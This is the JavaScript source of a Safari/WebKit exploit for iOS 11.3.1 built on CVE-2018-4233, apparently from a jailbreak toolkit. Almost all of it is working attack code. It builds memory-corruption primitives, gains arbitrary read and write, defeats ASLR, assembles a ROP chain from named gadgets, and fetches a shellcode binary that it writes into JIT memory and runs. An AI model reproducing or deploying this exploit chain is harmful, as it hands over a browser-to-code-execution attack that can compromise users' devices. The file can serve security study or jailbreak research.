/***
 *     ██╗ ██╗    ██████╗                ██╗ ██╗   ██████╗    ██╗
 *    ███║███║   ██╔═████╗              ███║███║   ╚════██╗  ███║
 *    ╚██║╚██║   ██║██╔██║    █████╗    ╚██║╚██║    █████╔╝  ╚██║
 *     ██║ ██║   ████╔╝██║    ╚════╝     ██║ ██║    ╚═══██╗   ██║
 *     ██║ ██║██╗╚██████╔╝               ██║ ██║██╗██████╔╝██╗██║
 *     ╚═╝ ╚═╝╚═╝ ╚═════╝                ╚═╝ ╚═╝╚═╝╚═════╝ ╚═╝╚═╝
 *		By Niklas B. from phoenhex
 *      Bug used: CVE-2018-4233 by Saelo
 */

using('verbosity');

var INTEGRITY_CHECKS = false; //enable this if you want to check the shellcode for integrity.

var UNITY = {
    TEN: 10,
    HUNDRED: 100,
    THOUSAND: 1000,
    MILLION: 1000000,
    BILLION: 1000000000
};

_off = {};

ITERS = UNITY.TEN * UNITY.THOUSAND;
ALLOCS = UNITY.THOUSAND;
counter = 0;

var conversion_buffer = new ArrayBuffer(8);
var f64 = new Float64Array(conversion_buffer);
var i32 = new Uint32Array(conversion_buffer);
var BASE32 = 0x100000000;


var workbuf = new ArrayBuffer(0x1000000)
var u32_buffer = new Uint32Array(workbuf);
var u8_buffer = new Uint8Array(workbuf);
var shellcode_length = 0;
var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;

//Float to Integer conversion
function f2i(f) {
    f64[0] = f;
    return i32[0] + BASE32 * i32[1];
}

//Integer to Float conversion
function i2f(i) {
    i32[0] = i % BASE32;
    i32[1] = i / BASE32;
    return f64[0];
}

//Hex conversion
function hex(x) {
    if (x < 0)
        return `-${hex(-x)}`
    return `0x${x.toString(16)}`
}

//Exclusive OR operand on two numbers
function xor(a, b) {
    var res = 0, base = 1;
    for(var i = 0; i < 64; ++i) {
        res += base * ((a&1) ^(b&1));
        a = (a-(a&1))/2;
        b = (b-(b&1))/2;
        base *= 2;
    }
    return res;
}

//function called for exploit failure notification
function fail(x) {
    if(x == 3)
        x = "I still need to update the exploit for older devices";
    throw new Error('Exploit failed: ' + x)
}

// CVE-2018-4233
function trigger(constr, modify, res, val) {
    return eval(`
    var o = [13.37]
    var Constructor${counter} = function(o) { ${constr} }
    var hack = false
    var Wrapper = new Proxy(Constructor${counter}, {
        get: function() {
            if (hack) {
                ${modify}
            }
        }
    })
    for (var i = 0; i < ITERS; ++i)
        new Wrapper(o)
    hack = true
    var bar = new Wrapper(o)
    ${res}
    `)
}

//The exploit
var pwn = function() {
    _off = window.chosendevice.offsets;
    console.log('Starting stage 1...');
    
    var stage1 = {
        addrof: function(victim) {
            return f2i(trigger('this.result = o[0]', 'o[0] = val', 'bar.result', victim));
        },
        
        fakeobj: function(addr) {
            return trigger('o[0] = val', 'o[0] = {}', 'o[0]', i2f(addr));
        },
        
        test: function() {
            var addr = this.addrof({a: 0x1337});
            var x = this.fakeobj(addr);
            if (x.a != 0x1337) {
                fail(1); //failed as we seem not to be vulnerable
            }
        }
    };
    
    stage1.test(); //sanity check to see if the vulnerability really exists
    
    //Spray the heap with structures
    var structure_spray = [];
    for (var i = 0; i < 1000; ++i) {
        // last property is 0xfffffff because we want that value to
        // preceed the manager, so when manager gets reused as
        // butterfly, it's vectorLength is big enough
        var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff};
        ary['prop'+i] = 1;
        structure_spray.push(ary);
    }
    
    //Leak the address of an aligned structure
    var manager = structure_spray[500];
    var leak_addr = stage1.addrof(manager); //Trigger the infoleak, we can read the address of any structure!
    
    if(verbosity === VERBOSITY.HIGH) print('leaking from '+hex(leak_addr));
    
    //function for allocating above
    function alloc_above_manager(expr) {
        var res
        do {
            for (var i = 0; i < ALLOCS; ++i) {
                structure_spray.push(eval(expr));
            }
            res = eval(expr);
        } while (stage1.addrof(res) < leak_addr)
        return res;
    }
    
    var unboxed_size = 100;
    // Two arrays are created: unboxed and boxed
    // their butterflies are then set to same value
    // so unboxed[i] would point to same memory as boxed[i]
    // this leads to easy type confusion:
    // JSValue (inc. pointers) with floats
    // see saelo's phrack article, look for "JSC defines a set of
    // different indexing types".
    // JSC sees huge array containing only floats, so they'd be stored
    // as floats and retrived as floats, not as normal JSValue's
    var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']'); //array with double
    var boxed = alloc_above_manager('[{}]'); //array with object
    var victim = alloc_above_manager('[]'); //array
    
    // Will be stored out-of-line at butterfly - 0x10
    victim.p0 = 0x1337; //first padding
    
    //set up r/w access to the victim
    function victim_write(val) {
        victim.p0 = val;
    }
    
    function victim_read() {
        return victim.p0;
    }
    
    i32[0] = 0x200;                // Structure ID
    i32[1] = 0x01082007 - 0x10000; // Fake JSCell metadata, adjusted for boxing
    var outer = {
        p0: 0, // Padding, so that the rest of inline properties are 16-byte aligned
        p1: f64[0],
        p2: manager,
        p3: 0xfffffff, // Butterfly indexing mask
    };
    

    if(verbosity === VERBOSITY.VERBOSE) print("Using padding: "+hex(FPO+0x8));
    
    var fake_addr = stage1.addrof(outer) +FPO+0x8;
    
    if(verbosity >= VERBOSITY.HIGH) print('fake object is at ' + hex(fake_addr));
    
    //leak the addresses of our cell
    var unboxed_addr = stage1.addrof(unboxed);
    var boxed_addr = stage1.addrof(boxed);
    var victim_addr = stage1.addrof(victim);
    
    if(verbosity >= VERBOSITY.HIGH) print('leak ' + hex(leak_addr)
                                          + '\nunboxed ' + hex(unboxed_addr)
                                          + '\nboxed ' + hex(boxed_addr)
                                          + '\nvictim ' + hex(victim_addr));
    
    var holder = {fake: {}};
    holder.fake = stage1.fakeobj(fake_addr); //now we have a fake object with control over it yay!
    
    // From here on GC would be uncool
    
    // Share a butterfly for easier boxing/unboxing
    var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8]);
    var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8];
    holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly);
    
    var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8];
    
    function set_victim_addr(where) {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10);
    }
    
    function reset_victim_addr() {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly;
    }
    
    print('Stage (1/2) done.');


    var stage2 = {
        addrof: function(victim) {
            boxed[0] = victim;
            return f2i(unboxed[0]);
        },

        fakeobj: function(addr) {
            unboxed[0] = i2f(addr);
            return boxed[0];
        },

        write64: function(where, what) {
            set_victim_addr(where);
            victim_write(this.fakeobj(what));
            reset_victim_addr();
        },

        read64: function(where) {
            set_victim_addr(where);
            var res = this.addrof(victim_read());
            reset_victim_addr();
            return res;
        },

        write_non_zero: function(where, values) {
            for (var i = 0; i < values.length; ++i) {
                if (values[i] != 0) {
                    this.write64(where + i*8, values[i]);
                }
            }
        },

        test: function() {
            this.write64(boxed_addr + 0x10, 0xfff); // Overwrite index mask, no biggie
            if (0xfff != this.read64(boxed_addr + 0x10)) {
                fail(2);
            }
        },

        forge: function(values) {
            for (var i = 0; i < values.length; ++i) {
                unboxed[1 + i] = i2f(values[i]);
            }
            return shared_butterfly + 8;
        },

        clear: function() {
            outer = null;
            holder.fake = null;
            for (var i = 0; i < unboxed_size; ++i) {
                boxed[0] = null;
            }
        },
    }

    stage2.test();
    if(verbosity === VERBOSITY.VERBOSE) print("Stage 2 test succeeded, continueing...");
    
    var wrapper = document.createElement('div');
    var wrapper_addr = stage2.addrof(wrapper);
    var el_addr = stage2.read64(wrapper_addr + 0x20);
    var vtab_addr = stage2.read64(el_addr);
    

    if(verbosity >= VERBOSITY.HIGH) print("Lets hope our offsets are correct as we will now use them.");

    //now get the ASLR slide
    var slide = stage2.read64(vtab_addr) - _off.vtable;
    var disablePrimitiveGigacage = _off.disableprimitivegigacage + slide;
    var callbacks = _off.callbacks + slide;
    var g_gigacageBasePtrs =  _off.g_gigacagebaseptrs + slide;
    var g_typedArrayPoisons = _off.g_typedarraypoisons + slide;
    var longjmp = _off.longjmp + slide;
    var dlsym = _off.dlsym + slide;

    var startOfFixedExecutableMemoryPool = stage2.read64(_off.startfixedmempool + slide);
    var endOfFixedExecutableMemoryPool = stage2.read64(_off.endfixedmempool + slide);
    var jitWriteSeparateHeapsFunction = stage2.read64(_off.jit_writeseperateheaps_func + slide);
    var useFastPermisionsJITCopy = stage2.read64(_off.usefastpermissions_jitcopy + slide);

    var ptr_stack_check_guard = _off.ptr_stack_check_guard + slide;

    // ModelIO:0x000000018d2f6564 :
    //   ldr x8, [sp, #0x28]
    //   ldr x0, [x8, #0x18]
    //   ldp x29, x30, [sp, #0x50]
    //   add sp, sp, #0x60
    //   ret
    var pop_x8 = _off.modelio_popx8 + slide;

    // CoreAudio:0x000000018409ddbc
    //   ldr x2, [sp, #8]
    //   mov x0, x2
    //   ldp x29, x30, [sp, #0x10]
    //   add sp, sp, #0x20
    //   ret
    var pop_x2 = _off.coreaudio_popx2 + slide;

    //see jitcode.s
    var linkcode_gadget = _off.linkcode_gadget + slide;

    print('\nSlide '+hex(slide)
        + '\ndisablePrimitiveGigacage @ ' + hex(disablePrimitiveGigacage)
        + '\ng_gigacageBasePtrs @ ' + hex(g_gigacageBasePtrs)
        + '\ng_typedArrayPoisons @ ' + hex(g_typedArrayPoisons)
        + '\nstartOfFixedExecutableMemoryPool @ ' + hex(startOfFixedExecutableMemoryPool)
        + '\nendOfFixedExecutableMemoryPool @ ' + hex(endOfFixedExecutableMemoryPool)
        + '\njitWriteSeparateHeapsFunction @ ' + hex(jitWriteSeparateHeapsFunction)
        + '\nuseFastPermisionsJITCopy @ ' + hex(useFastPermisionsJITCopy)
    );

    //JIT Hardening stuff
    if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
        // Probably an older phone, should be even easier
        //fail(3);
    }
    
    if(verbosity === VERBOSITY.VERBOSE) print("Setting up shellcode in memory...");

    //Now set up our shellcode for code execution
    var callback_vector = stage2.read64(callbacks);

    var poison = stage2.read64(g_typedArrayPoisons + 6*8);
    var buffer_addr = xor(stage2.read64(stage2.addrof(u32_buffer) + 0x18), poison);

    var shellcode_src = buffer_addr + 0x4000;
    var shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000;

    if (shellcode_dst < startOfFixedExecutableMemoryPool) {
        fail(4);
    }

    stage2.write64(shellcode_src + 4, dlsym);
              
    //set up our fake executable stack
    var fake_stack = [
        0,
        shellcode_length,  // x2
        0,
        
        pop_x8,
        
        0, 0, 0, 0, 0,
        shellcode_dst, // x8
        0, 0, 0, 0,
        stage2.read64(ptr_stack_check_guard) + 0x58,
        
        linkcode_gadget,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        
        shellcode_dst
    ];
              
    // Set up fake vtable at offset 0
    u32_buffer[0] = longjmp % BASE32;
    u32_buffer[1] = longjmp / BASE32;

    // Set up fake stack at offset 0x2000
    for (var i = 0; i < fake_stack.length; ++i) {
          u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32;
          u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32;
    }
    
    //lets set up our code execution of the dylib payload
    stage2.write_non_zero(el_addr, [
        buffer_addr, // fake vtable
        0,
        shellcode_src, // x21
        0, 0, 0, 0, 0, 0, 0,
        0, // fp

        pop_x2, // lr
        0,
        buffer_addr + 0x2000, // sp
    ]);

    //if(verbosity >= VERBOSITY.HIGH) print('shellcode is at ' + hex(shellcode_dst));
    if(verbosity >= VERBOSITY.DEFAULT) print('EmptyList is started, please close all background apps then dismiss this alert.');
    wrapper.addEventListener('click', function(){}); //execute the shellcode
};

function integrity_checks(buffer) {
    if(INTEGRITY_CHECKS) {
        var shellcode_data = new Uint8Array(buffer);
        var shellcode_hashes = {
            md5: md5(shellcode_data.join('')),
            sha1: Sha1.hash(shellcode_data.join('')),
            sha256: sha512_256(shellcode_data.join('')),
            sha384: sha384(shellcode_data.join('')),
            sha512: sha512(shellcode_data.join(''))
        };
        
        if(
            shellcode_hashes.md5 !== "5b8d489beb89a7515dc7fb5ee2f4092d" || 
            shellcode_hashes.sha1 !== "5d97f3843c1a3b88c7a95dae803b46e07a67d3ed" ||
            shellcode_hashes.sha256 !== "a4a3254bc86d5b2030c0637173b927a489b98d1d29fcfcc8232636eec94a2fe8" ||
            shellcode_hashes.sha384 !== "78791343c427ddd51c1bc236f77bafc4cfef04796f931d856e6652aadedb5ab54e46fe9b05e98ce7dc982eba9f1c6220" ||
            shellcode_hashes.sha512 !== "ef48614b78b42be7bedb79a7aa768eb19ad8fb05cefac2d68c8d74ab6a95d77aa1054d255294b5bf7e9ece648ac916fa8999e79aa93a707732b9850418bd0053"
        ) throw new Error('Shellcode integrity check failed.');
    }
}

//The exploit initialization 
function wk113go() {
    
    //retrieve the shellcode containing the empty_list exploit by Ian Beer (Needs some work, doesn't check for request status code)
    fetch('payloads/11_3_1/emptylist.bin').then((response) => {
        response.arrayBuffer().then((buffer) => {
            try{

                shellcode_length = buffer.byteLength; //Get the length of the shellcode array
                
                //check whether our shellcode exceeds our executable region size that will be set up later
                if(shellcode_length > 0x1000000) {
                    fail(5);
                }
                integrity_checks(buffer);
                u8_buffer.set(new Uint8Array(buffer), 0x4000); //basically the same as what memset() and memcpy would do in c. uint8 is a char array containing our shellcode
                if(verbosity === VERBOSITY.HIGH) print('Received '+shellcode_length+ ' bytes of shellcode. Exploit will start now.');
                pwn();
            } catch(exception) {
                alert(exception); //We do not want our script to fail, so we catch all exceptions if they occur and continue
            }
        });
    });
};
